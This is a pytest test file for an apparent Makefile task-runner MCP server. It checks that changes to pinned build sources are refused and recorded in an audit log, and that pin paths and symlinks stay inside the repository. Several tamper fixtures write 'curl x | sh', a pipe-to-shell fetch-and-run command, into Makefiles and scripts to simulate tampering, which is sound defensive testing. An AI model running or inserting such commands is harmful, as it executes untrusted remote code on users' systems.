import asyncio
import json

import pytest

from makefile_mcp.app import build_application
from makefile_mcp.errors import ConfigurationError

MAKEFILE = ".PHONY: test\ntest:\n\t@sh scripts/test.sh\n"
PINNED = (
    "schema_version: 1\n"
    "audit:\n  path: logs/audit.jsonl\n"
    "pin:\n  paths: [scripts]\n"
    "tasks:\n  test: {}\n"
)


@pytest.fixture
def pinned_repo(repo):
    root = repo(MAKEFILE, PINNED)
    (root / "scripts").mkdir()
    (root / "scripts/test.sh").write_text("echo ok\n", encoding="utf-8")
    return root


@pytest.mark.parametrize(
    "tamper",
    [
        lambda root: (root / "Makefile").write_text(
            MAKEFILE.replace("@sh", "@curl x | sh; sh"), encoding="utf-8"
        ),
        lambda root: (root / "scripts/test.sh").write_text("curl x | sh\n", encoding="utf-8"),
        lambda root: (root / "scripts/extra.sh").write_text("echo\n", encoding="utf-8"),
    ],
    ids=["makefile", "script", "new-file"],
)
def test_changing_a_pinned_source_fails_closed_and_is_audited(pinned_repo, tamper):
    app = build_application(pinned_repo)
    assert asyncio.run(app.run_task("test")).stdout.strip() == "ok"

    tamper(pinned_repo)

    with pytest.raises(ConfigurationError, match="pinned Make sources changed"):
        asyncio.run(app.run_task("test"))
    with pytest.raises(ConfigurationError, match="pinned Make sources changed"):
        app.list_tasks()
    lines = (pinned_repo / "logs/audit.jsonl").read_text(encoding="utf-8").splitlines()
    last = json.loads(lines[-1])
    assert (last["status"], last["task"]) == ("refused", "test")
    assert "pinned" in last["reason"]


def test_without_pin_make_sources_stay_live(repo):
    root = repo(
        MAKEFILE.replace("@sh scripts/test.sh", "@echo one"),
        "schema_version: 1\ntasks:\n  test: {}\n",
    )
    app = build_application(root)
    (root / "Makefile").write_text(MAKEFILE.replace("@sh scripts/test.sh", "@echo two"), "utf-8")

    assert asyncio.run(app.run_task("test")).stdout.strip() == "two"


def test_pin_path_must_stay_inside_the_repository(repo, tmp_path_factory):
    outside = tmp_path_factory.mktemp("outside")
    root = repo(MAKEFILE, PINNED.replace("[scripts]", f"[{outside}]"))

    with pytest.raises(ConfigurationError, match="invalid pin path"):
        build_application(root)


def test_pin_covers_conditional_includes_and_symlinked_directories(repo):
    root = repo(
        MAKEFILE + "ifeq ($(CI),)\ninclude mk/rules.mk\nendif\n",
        "schema_version: 1\npin:\n  paths: [scripts]\ntasks:\n  test: {}\n",
    )
    (root / "mk").mkdir()
    (root / "mk/rules.mk").write_text("X := 1\n", encoding="utf-8")
    (root / "lib").mkdir()
    (root / "lib/helper.sh").write_text("echo helper\n", encoding="utf-8")
    (root / "scripts").mkdir()
    (root / "scripts/test.sh").write_text("echo ok\n", encoding="utf-8")
    (root / "scripts/lib").symlink_to("../lib")

    for tamper in (root / "mk/rules.mk", root / "lib/helper.sh"):
        app = build_application(root)
        tamper.write_text("curl x | sh\n", encoding="utf-8")
        with pytest.raises(ConfigurationError, match="pinned Make sources changed"):
            app.list_tasks()


def test_pinned_symlink_leaving_the_repository_is_refused(pinned_repo, tmp_path_factory):
    outside = tmp_path_factory.mktemp("outside")
    (pinned_repo / "scripts/escape").symlink_to(outside)

    with pytest.raises(ConfigurationError, match="invalid pin path"):
        build_application(pinned_repo)
